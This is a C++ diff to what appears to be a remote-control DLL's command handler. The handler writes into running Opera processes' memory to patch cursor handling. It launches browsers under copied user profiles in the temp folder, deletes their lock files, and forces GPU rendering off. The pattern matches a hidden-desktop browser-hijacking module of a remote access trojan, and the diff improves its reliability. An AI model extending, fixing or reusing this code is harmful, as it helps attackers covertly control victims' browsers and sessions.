@@ -191,6 +191,17 @@ static bool patch_cursor_info(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProcess) return false;
 
+    BOOL isOurWow64 = FALSE;
+    IsWow64Process(GetCurrentProcess(), &isOurWow64);
+
+    BOOL isTargetWow64 = FALSE;
+    IsWow64Process(hProcess, &isTargetWow64);
+
+    if (isOurWow64 != isTargetWow64) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
     bool is32Bit = false;
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
@@ -237,6 +248,8 @@ static bool patch_cursor_info(DWORD pid) {
     return false;
 }
 
+static vector<DWORD> g_patchedPids;
+
 static void patch_all_opera_processes() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
@@ -247,7 +260,12 @@ static void patch_all_opera_processes() {
     if (Process32FirstW(hSnap, &pe32)) {
         do {
             if (_wcsicmp(pe32.szExeFile, L"opera.exe") == 0) {
-                patch_cursor_info(pe32.th32ProcessID);
+                DWORD pid = pe32.th32ProcessID;
+                if (find(g_patchedPids.begin(), g_patchedPids.end(), pid) == g_patchedPids.end()) {
+                    if (patch_cursor_info(pid)) {
+                        g_patchedPids.push_back(pid);
+                    }
+                }
             }
         } while (Process32NextW(hSnap, &pe32));
     }
@@ -1882,6 +1900,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
             if (g_patchThread.joinable())   g_patchThread.join();
+            g_patchedPids.clear();
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -2093,7 +2112,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                     }
 
-                    if (!copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!copyProfile && (isGecko || wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2112,7 +2131,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring args;
                     if (isGecko) {
                         args = L" -no-remote";
-                        if (copyProfile) {
+                        if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
@@ -2182,6 +2201,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (!profilePath.empty()) {
                         try {
                             if (isGecko) {
+                                fs::create_directories(profilePath);
+                                fs::path userJsPath = fs::path(profilePath) / L"user.js";
+                                FILE* f = _wfopen(userJsPath.wstring().c_str(), L"a");
+                                if (f) {
+                                    fputs("user_pref(\"gfx.webrender.force-disabled\", true);\n", f);
+                                    fputs("user_pref(\"layers.acceleration.disabled\", true);\n", f);
+                                    fputs("user_pref(\"media.hardware-video-decoding.enabled\", false);\n", f);
+                                    fclose(f);
+                                }
                                 fs::remove(fs::path(profilePath) / L"parent.lock");
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
